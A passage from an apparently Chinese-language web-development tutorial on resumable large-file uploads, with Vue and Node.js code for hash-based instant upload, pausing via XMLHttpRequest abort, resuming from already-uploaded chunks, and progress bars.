线程传入所有切片 fileChunkList，并监听 worker 线程发出的 postMessage 事件拿到文件 hash<br />加上显示计算 hash 的进度条，看起来像这样<br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2020/webp/164572/1588598300867-a57f7705-b2a5-4b7b-b47a-3e31dcff830f.webp" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2020/webp/164572/1588598300867-a57f7705-b2a5-4b7b-b47a-3e31dcff830f.webp" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"><br><a name="Yej4T"></a></p><h2 id="文件秒传"><a href="#文件秒传" class="headerlink" title="文件秒传"></a>文件秒传</h2><p>在实现断点续传前先简单介绍一下文件秒传<br />所谓的文件秒传，即在服务端已经存在了上传的资源，所以当用户<code>再次上传</code>时会直接提示上传成功<br />文件秒传需要依赖上一步生成的 hash，即在<code>上传前</code>，先计算出文件 hash，并把 hash 发送给服务端进行验证，由于 hash 的唯一性，所以一旦服务端能找到 hash 相同的文件，则直接返回上传成功的信息即可</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"> <span class="keyword">async</span> <span class="title function_">verifyUpload</span>(<span class="params">filename, fileHash</span>) &#123;</span><br><span class="line">       <span class="keyword">const</span> &#123; data &#125; = <span class="keyword">await</span> <span class="variable language_">this</span>.<span class="title function_">request</span>(&#123;</span><br><span class="line">           <span class="attr">url</span>: <span class="string">&quot;http://localhost:3000/verify&quot;</span>,</span><br><span class="line">         <span class="attr">headers</span>: &#123;</span><br><span class="line">               <span class="string">&quot;content-type&quot;</span>: <span class="string">&quot;application/json&quot;</span></span><br><span class="line">             &#125;,</span><br><span class="line">                <span class="attr">data</span>: <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(&#123;</span><br><span class="line">                     filename,</span><br><span class="line">                      fileHash</span><br><span class="line">                    &#125;)</span><br><span class="line">                 &#125;);</span><br><span class="line">      <span class="keyword">return</span> <span class="title class_">JSON</span>.<span class="title function_">parse</span>(data);</span><br><span class="line">    &#125;,</span><br><span class="line">  <span class="keyword">async</span> <span class="title function_">handleUpload</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">if</span> (!<span class="variable language_">this</span>.<span class="property">container</span>.<span class="property">file</span>) <span class="keyword">return</span>;</span><br><span class="line">  <span class="keyword">const</span> fileChunkList = <span class="variable language_">this</span>.<span class="title function_">createFileChunk</span>(<span class="variable language_">this</span>.<span class="property">container</span>.<span class="property">file</span>);</span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">container</span>.<span class="property">hash</span> = <span class="keyword">await</span> <span class="variable language_">this</span>.<span class="title function_">calculateHash</span>(fileChunkList);</span><br><span class="line">       <span class="keyword">const</span> &#123; shouldUpload &#125; = <span class="keyword">await</span> <span class="variable language_">this</span>.<span class="title function_">verifyUpload</span>(</span><br><span class="line">           <span class="variable language_">this</span>.<span class="property">container</span>.<span class="property">file</span>.<span class="property">name</span>,</span><br><span class="line">           <span class="variable language_">this</span>.<span class="property">container</span>.<span class="property">hash</span></span><br><span class="line">         );</span><br><span class="line">       <span class="keyword">if</span> (!shouldUpload) &#123;</span><br><span class="line">           <span class="variable language_">this</span>.<span class="property">$message</span>.<span class="title function_">success</span>(<span class="string">&quot;秒传：上传成功&quot;</span>);</span><br><span class="line">           <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">data</span> = fileChunkList.<span class="title function_">map</span>(<span class="function">(<span class="params">&#123; file &#125;, index</span>) =&gt;</span> (&#123;</span><br><span class="line">    <span class="attr">fileHash</span>: <span class="variable language_">this</span>.<span class="property">container</span>.<span class="property">hash</span>,</span><br><span class="line">    index,</span><br><span class="line">    <span class="attr">hash</span>: <span class="variable language_">this</span>.<span class="property">container</span>.<span class="property">hash</span> + <span class="string">&quot;-&quot;</span> + index,</span><br><span class="line">    <span class="attr">chunk</span>: file,</span><br><span class="line">    <span class="attr">percentage</span>: <span class="number">0</span></span><br><span class="line">  &#125;));</span><br><span class="line">  <span class="keyword">await</span> <span class="variable language_">this</span>.<span class="title function_">uploadChunks</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>秒传其实就是给用户看的障眼法，实质上根本没有上传<br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2020/webp/164572/1588598300741-7b208cf0-fd2b-4877-9aab-a3c7fa60dc41.webp" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2020/webp/164572/1588598300741-7b208cf0-fd2b-4877-9aab-a3c7fa60dc41.webp" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"><br />服务端的逻辑非常简单，新增一个验证接口，验证文件是否存在即可</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">+ const extractExt = filename =&gt;</span><br><span class="line">+  filename.slice(filename.lastIndexOf(&quot;.&quot;), filename.length); // 提取后缀名</span><br><span class="line">const UPLOAD_DIR = path.resolve(__dirname, &quot;..&quot;, &quot;target&quot;); // 大文件存储目录</span><br><span class="line">const resolvePost = req =&gt;</span><br><span class="line">  new Promise(resolve =&gt; &#123;</span><br><span class="line">    let chunk = &quot;&quot;;</span><br><span class="line">    req.on(&quot;data&quot;, data =&gt; &#123;</span><br><span class="line">      chunk += data;</span><br><span class="line">    &#125;);</span><br><span class="line">    req.on(&quot;end&quot;, () =&gt; &#123;</span><br><span class="line">      resolve(JSON.parse(chunk));</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;);</span><br><span class="line">server.on(&quot;request&quot;, async (req, res) =&gt; &#123;</span><br><span class="line">  if (req.url === &quot;/verify&quot;) &#123;</span><br><span class="line">+    const data = await resolvePost(req);</span><br><span class="line">+    const &#123; fileHash, filename &#125; = data;</span><br><span class="line">+    const ext = extractExt(filename);</span><br><span class="line">+    const filePath = path.resolve(UPLOAD_DIR, `$&#123;fileHash&#125;$&#123;ext&#125;`);</span><br><span class="line">+    if (fse.existsSync(filePath)) &#123;</span><br><span class="line">+      res.end(</span><br><span class="line">+        JSON.stringify(&#123;</span><br><span class="line">+          shouldUpload: false</span><br><span class="line">+        &#125;)</span><br><span class="line">+      );</span><br><span class="line">+    &#125; else &#123;</span><br><span class="line">+      res.end(</span><br><span class="line">+        JSON.stringify(&#123;</span><br><span class="line">+          shouldUpload: true</span><br><span class="line">+        &#125;)</span><br><span class="line">+      );</span><br><span class="line">+    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br><span class="line">server.listen(3000, () =&gt; console.log(&quot;正在监听 3000 端口&quot;));</span><br><span class="line">复制代码</span><br></pre></td></tr></table></figure><p><a name="fh147"></a></p><h2 id="暂停上传"><a href="#暂停上传" class="headerlink" title="暂停上传"></a>暂停上传</h2><p>讲完了生成 hash 和文件秒传，回到断点续传<br />断点续传顾名思义即断点 + 续传，所以我们第一步先实现“断点”，也就是暂停上传<br />原理是使用 XMLHttpRequest 的 <code>abort</code> 方法，可以取消一个 xhr 请求的发送，为此我们需要将上传每个切片的 xhr 对象保存起来，我们再改造一下 request 方法</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">request</span>(<span class="params">&#123;</span></span><br><span class="line"><span class="params">  url,</span></span><br><span class="line"><span class="params">  method = <span class="string">&quot;post&quot;</span>,</span></span><br><span class="line"><span class="params">  data,</span></span><br><span class="line"><span class="params">  headers = &#123;&#125;,</span></span><br><span class="line"><span class="params">  onProgress = e =&gt; e,</span></span><br><span class="line"><span class="params">  +     requestList</span></span><br><span class="line"><span class="params">&#125;</span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function"><span class="params">resolve</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> xhr = <span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>();</span><br><span class="line">    xhr.<span class="property">upload</span>.<span class="property">onprogress</span> = onProgress;</span><br><span class="line">    xhr.<span class="title function_">open</span>(method, url);</span><br><span class="line">    <span class="title class_">Object</span>.<span class="title function_">keys</span>(headers).<span class="title function_">forEach</span>(<span class="function"><span class="params">key</span> =&gt;</span></span><br><span class="line">      xhr.<span class="title function_">setRequestHeader</span>(key, headers[key])</span><br><span class="line">                                );</span><br><span class="line">    xhr.<span class="title function_">send</span>(data);</span><br><span class="line">    xhr.<span class="property">onload</span> = <span class="function"><span class="params">e</span> =&gt;</span> &#123;</span><br><span class="line">      +          <span class="comment">// 将请求成功的 xhr 从列表中删除</span></span><br><span class="line">        +          <span class="keyword">if</span> (requestList) &#123;</span><br><span class="line">          +            <span class="keyword">const</span> xhrIndex = requestList.<span class="title function_">findIndex</span>(<span class="function"><span class="params">item</span> =&gt;</span> item === xhr);</span><br><span class="line">      +            requestList.<span class="title function_">splice</span>(xhrIndex, <span class="number">1</span>);</span><br><span class="line">      +          &#125;</span><br><span class="line">    <span class="title function_">resolve</span>(&#123;</span><br><span class="line">      <span class="attr">data</span>: e.<span class="property">target</span>.<span class="property">response</span></span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;;</span><br><span class="line">  +        <span class="comment">// 暴露当前 xhr 给外部</span></span><br><span class="line">    +        requestList?.<span class="title function_">push</span>(xhr);</span><br><span class="line">&#125;);</span><br><span class="line">&#125;,</span><br><span class="line">复制代码</span><br></pre></td></tr></table></figure><p>这样在上传切片时传入 requestList 数组作为参数，request 方法就会将所有的 xhr 保存在数组中了<br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2020/webp/164572/1588598300757-94a96d06-f062-4781-88ba-43e341f88d21.webp" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2020/webp/164572/1588598300757-94a96d06-f062-4781-88ba-43e341f88d21.webp" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"><br />每当一个切片上传成功时，将对应的 xhr 从 requestList 中删除，所以 requestList 中只保存<code>正在上传切片的 xhr</code><br />之后新建一个暂停按钮，当点击按钮时，调用保存在 requestList 中 xhr 的 abort 方法，即取消并清空所有正在上传的切片</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">handlePause() &#123;</span><br><span class="line">    this.requestList.forEach(xhr =&gt; xhr?.abort());</span><br><span class="line">    this.requestList = [];</span><br><span class="line">&#125;</span><br><span class="line">复制代码</span><br></pre></td></tr></table></figure><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2020/webp/164572/1588598300759-fb955ace-99a2-48ae-bc2e-0007baf433ac.webp" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2020/webp/164572/1588598300759-fb955ace-99a2-48ae-bc2e-0007baf433ac.webp" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"><br><a name="zm3d9"></a></p><h2 id="恢复上传"><a href="#恢复上传" class="headerlink" title="恢复上传"></a>恢复上传</h2><p>之前在介绍断点续传的时提到使用第二种服务端存储的方式实现续传<br />由于当文件切片上传后，服务端会建立一个文件夹存储所有上传的切片，所以每次前端上传前可以调用一个接口，服务端将已上传的切片的切片名返回，前端再跳过这些已经上传切片，这样就实现了“续传”的效果<br />而这个接口可以和之前秒传的验证接口合并，前端每次上传前发送一个验证的请求，返回两种结果</p><ul><li>服务端已存在该文件，不需要再次上传</li><li>服务端不存在该文件或者已上传部分文件切片，通知前端进行上传，并把<strong>已上传</strong>的文件切片返回给前端</li></ul><p>所以我们改造一下之前文件秒传的服务端验证接口</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title function_">extractExt</span> = filename =&gt;</span><br><span class="line">  filename.<span class="title function_">slice</span>(filename.<span class="title function_">lastIndexOf</span>(<span class="string">&quot;.&quot;</span>), filename.<span class="property">length</span>); <span class="comment">// 提取后缀名</span></span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">UPLOAD_DIR</span> = path.<span class="title function_">resolve</span>(__dirname, <span class="string">&quot;..&quot;</span>, <span class="string">&quot;target&quot;</span>); <span class="comment">// 大文件存储目录</span></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">resolvePost</span> = req =&gt;</span><br><span class="line">  <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function"><span class="params">resolve</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">let</span> chunk = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    req.<span class="title function_">on</span>(<span class="string">&quot;data&quot;</span>, <span class="function"><span class="params">data</span> =&gt;</span> &#123;</span><br><span class="line">      chunk += data;</span><br><span class="line">    &#125;);</span><br><span class="line">    req.<span class="title function_">on</span>(<span class="string">&quot;end&quot;</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">      <span class="title function_">resolve</span>(<span class="title class_">JSON</span>.<span class="title function_">parse</span>(chunk));</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;);</span><br><span class="line"></span><br><span class="line">+  <span class="comment">// 返回已经上传切片名列表</span></span><br><span class="line">  + <span class="keyword">const</span> <span class="title function_">createUploadedList</span> = <span class="keyword">async</span> fileHash =&gt;</span><br><span class="line">    +   fse.<span class="title function_">existsSync</span>(path.<span class="title function_">resolve</span>(<span class="variable constant_">UPLOAD_DIR</span>, fileHash))</span><br><span class="line">    +    ? <span class="keyword">await</span> fse.<span class="title function_">readdir</span>(path.<span class="title function_">resolve</span>(<span class="variable constant_">UPLOAD_DIR</span>, fileHash))</span><br><span class="line">    +    : [];</span><br><span class="line">server.<span class="title function_">on</span>(<span class="string">&quot;request&quot;</span>, <span class="keyword">async</span> (req, res) =&gt; &#123;</span><br><span class="line">  <span class="keyword">if</span> (req.<span class="property">url</span> === <span class="string">&quot;/verify&quot;</span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> data = <span class="keyword">await</span> <span class="title function_">resolvePost</span>(req);</span><br><span class="line">    <span class="keyword">const</span> &#123; fileHash, filename &#125; = data;</span><br><span class="line">    <span class="keyword">const</span> ext = <span class="title function_">extractExt</span>(filename);</span><br><span class="line">    <span class="keyword">const</span> filePath = path.<span class="title function_">resolve</span>(<span class="variable constant_">UPLOAD_DIR</span>, <span class="string">`<span class="subst">$&#123;fileHash&#125;</span><span class="subst">$&#123;ext&#125;</span>`</span>);</span><br><span class="line">    <span class="keyword">if</span> (fse.<span class="title function_">existsSync</span>(filePath)) &#123;</span><br><span class="line">      res.<span class="title function_">end</span>(</span><br><span class="line">        <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(&#123;</span><br><span class="line">          <span class="attr">shouldUpload</span>: <span class="literal">false</span></span><br><span class="line">        &#125;)</span><br><span class="line">      );</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      res.<span class="title function_">end</span>(</span><br><span class="line">        <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(&#123;</span><br><span class="line">          <span class="attr">shouldUpload</span>: <span class="literal">true</span>，</span><br><span class="line">            +         <span class="attr">uploadedList</span>: <span class="keyword">await</span> <span class="title function_">createUploadedList</span>(fileHash)</span><br><span class="line">        &#125;)</span><br><span class="line">      );</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br><span class="line">server.<span class="title function_">listen</span>(<span class="number">3000</span>, <span class="function">() =&gt;</span> <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;正在监听 3000 端口&quot;</span>));</span><br><span class="line">复制代码</span><br></pre></td></tr></table></figure><p>接着回到前端，前端有两个地方需要调用验证的接口</p><ul><li>点击上传时，检查是否需要上传和已上传的切片</li><li>点击暂停后的恢复上传，返回已上传的切片</li></ul><p>新增恢复按钮并改造原来上传切片的逻辑</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  <span class="language-xml"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;app&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">  <span class="tag">&lt;<span class="name">input</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml"><span class="attr">type</span>=<span class="string">&quot;file&quot;</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">@<span class="attr">change</span>=<span class="string">&quot;handleFileChange&quot;</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">  /&gt;</span></span></span><br><span class="line"><span class="language-xml">  <span class="tag">&lt;<span class="name">el-button</span> @<span class="attr">click</span>=<span class="string">&quot;handleUpload&quot;</span>&gt;</span>上传<span class="tag">&lt;/<span class="name">el-button</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">  <span class="tag">&lt;<span class="name">el-button</span> @<span class="attr">click</span>=<span class="string">&quot;handlePause&quot;</span> <span class="attr">v-if</span>=<span class="string">&quot;isPaused&quot;</span>&gt;</span>暂停<span class="tag">&lt;/<span class="name">el-button</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">  +      <span class="tag">&lt;<span class="name">el-button</span> @<span class="attr">click</span>=<span class="string">&quot;handleResume&quot;</span> <span class="attr">v-else</span>&gt;</span>恢复<span class="tag">&lt;/<span class="name">el-button</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">  //...</span></span><br><span class="line"><span class="language-xml">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">  &lt;/template&gt;</span><br><span class="line">  +   <span class="keyword">async</span> <span class="title function_">handleResume</span>(<span class="params"></span>) &#123;</span><br><span class="line">  +      <span class="keyword">const</span> &#123; uploadedList &#125; = <span class="keyword">await</span> <span class="variable language_">this</span>.<span class="title function_">verifyUpload</span>(</span><br><span class="line">    +        <span class="variable language_">this</span>.<span class="property">container</span>.<span class="property">file</span>.<span class="property">name</span>,</span><br><span class="line">    +        <span class="variable language_">this</span>.<span class="property">container</span>.<span class="property">hash</span></span><br><span class="line">    +      );</span><br><span class="line">  +      <span class="keyword">await</span> <span class="variable language_">this</span>.<span class="title function_">uploadChunks</span>(uploadedList);</span><br><span class="line">&#125;,</span><br><span class="line"><span class="keyword">async</span> <span class="title function_">handleUpload</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">if</span> (!<span class="variable language_">this</span>.<span class="property">container</span>.<span class="property">file</span>) <span class="keyword">return</span>;</span><br><span class="line">  <span class="keyword">const</span> fileChunkList = <span class="variable language_">this</span>.<span class="title function_">createFileChunk</span>(<span class="variable language_">this</span>.<span class="property">container</span>.<span class="property">file</span>);</span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">container</span>.<span class="property">hash</span> = <span class="keyword">await</span> <span class="variable language_">this</span>.<span class="title function_">calculateHash</span>(fileChunkList);</span><br><span class="line">  +     <span class="keyword">const</span> &#123; shouldUpload, uploadedList &#125; = <span class="keyword">await</span> <span class="variable language_">this</span>.<span class="title function_">verifyUpload</span>(</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">container</span>.<span class="property">file</span>.<span class="property">name</span>,</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">container</span>.<span class="property">hash</span></span><br><span class="line">  );</span><br><span class="line">  <span class="keyword">if</span> (!shouldUpload) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">$message</span>.<span class="title function_">success</span>(<span class="string">&quot;秒传：上传成功&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">data</span> = fileChunkList.<span class="title function_">map</span>(<span class="function">(<span class="params">&#123; file &#125;, index</span>) =&gt;</span> (&#123;</span><br><span class="line">    <span class="attr">fileHash</span>: <span class="variable language_">this</span>.<span class="property">container</span>.<span class="property">hash</span>,</span><br><span class="line">    index,</span><br><span class="line">    <span class="attr">hash</span>: <span class="variable language_">this</span>.<span class="property">container</span>.<span class="property">hash</span> + <span class="string">&quot;-&quot;</span> + index,</span><br><span class="line">    <span class="attr">chunk</span>: file，</span><br><span class="line">      <span class="attr">percentage</span>: <span class="number">0</span></span><br><span class="line">&#125;));</span><br><span class="line">+      <span class="keyword">await</span> <span class="variable language_">this</span>.<span class="title function_">uploadChunks</span>(uploadedList);</span><br><span class="line">&#125;,</span><br><span class="line"><span class="comment">// 上传切片，同时过滤已上传的切片</span></span><br><span class="line">+   <span class="keyword">async</span> <span class="title function_">uploadChunks</span>(<span class="params">uploadedList = []</span>) &#123;</span><br><span class="line">  <span class="keyword">const</span> requestList = <span class="variable language_">this</span>.<span class="property">data</span></span><br><span class="line">    +        .<span class="title function_">filter</span>(<span class="function">(<span class="params">&#123; hash &#125;</span>) =&gt;</span> !uploadedList.<span class="title function_">includes</span>(hash))</span><br><span class="line">    .<span class="title function_">map</span>(<span class="function">(<span class="params">&#123; chunk, hash, index &#125;</span>) =&gt;</span> &#123;</span><br><span class="line">      <span class="keyword">const</span> formData = <span class="keyword">new</span> <span class="title class_">FormData</span>();</span><br><span class="line">      formData.<span class="title function_">append</span>(<span class="string">&quot;chunk&quot;</span>, chunk);</span><br><span class="line">      formData.<span class="title function_">append</span>(<span class="string">&quot;hash&quot;</span>, hash);</span><br><span class="line">      formData.<span class="title function_">append</span>(<span class="string">&quot;filename&quot;</span>, <span class="variable language_">this</span>.<span class="property">container</span>.<span class="property">file</span>.<span class="property">name</span>);</span><br><span class="line">      formData.<span class="title function_">append</span>(<span class="string">&quot;fileHash&quot;</span>, <span class="variable language_">this</span>.<span class="property">container</span>.<span class="property">hash</span>);</span><br><span class="line">      <span class="keyword">return</span> &#123; formData, index &#125;;</span><br><span class="line">    &#125;)</span><br><span class="line">    .<span class="title function_">map</span>(<span class="keyword">async</span> (&#123; formData, index &#125;) =&gt;</span><br><span class="line">      <span class="variable language_">this</span>.<span class="title function_">request</span>(&#123;</span><br><span class="line">        <span class="attr">url</span>: <span class="string">&quot;http://localhost:3000&quot;</span>,</span><br><span class="line">        <span class="attr">data</span>: formData,</span><br><span class="line">        <span class="attr">onProgress</span>: <span class="variable language_">this</span>.<span class="title function_">createProgressHandler</span>(<span class="variable language_">this</span>.<span class="property">data</span>[index]),</span><br><span class="line">        <span class="attr">requestList</span>: <span class="variable language_">this</span>.<span class="property">requestList</span></span><br><span class="line">      &#125;)</span><br><span class="line">        );</span><br><span class="line">  <span class="keyword">await</span> <span class="title class_">Promise</span>.<span class="title function_">all</span>(requestList);</span><br><span class="line">  <span class="comment">// 之前上传的切片数量 + 本次上传的切片数量 = 所有切片数量时</span></span><br><span class="line">  <span class="comment">// 合并切片</span></span><br><span class="line">  +      <span class="keyword">if</span> (uploadedList.<span class="property">length</span> + requestList.<span class="property">length</span> === <span class="variable language_">this</span>.<span class="property">data</span>.<span class="property">length</span>) &#123;</span><br><span class="line">    <span class="keyword">await</span> <span class="variable language_">this</span>.<span class="title function_">mergeRequest</span>();</span><br><span class="line">    +      &#125;</span><br><span class="line">&#125;</span><br><span class="line">复制代码</span><br></pre></td></tr></table></figure><p>这里给原来上传切片的函数新增 uploadedList 参数，即上图中服务端返回的切片名列表，通过 filter 过滤掉已上传的切片，并且由于新增了已上传的部分，所以之前合并接口的触发条件做了一些改动<br />到这里断点续传的功能基本完成了<br><a name="BsZm5"></a></p><h2 id="进度条改进"><a href="#进度条改进" class="headerlink" title="进度条改进"></a>进度条改进</h2><p>虽然实现了断点续传，但还需要修改一下进度条的显示规则，否则在暂停上传&#x2F;接收到已上传切片时的进度条会出现偏差<br><a name="1s458"></a></p><h3 id="切片进度条-1"><a href="#切片进度条-1" class="headerlink" title="切片进度条"></a>切片进度条</h3><p>由于在点击上传&#x2F;恢复上传时，会调用验证接口返回已上传的切片，所以需要将已上传切片的进度变成 100%</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span 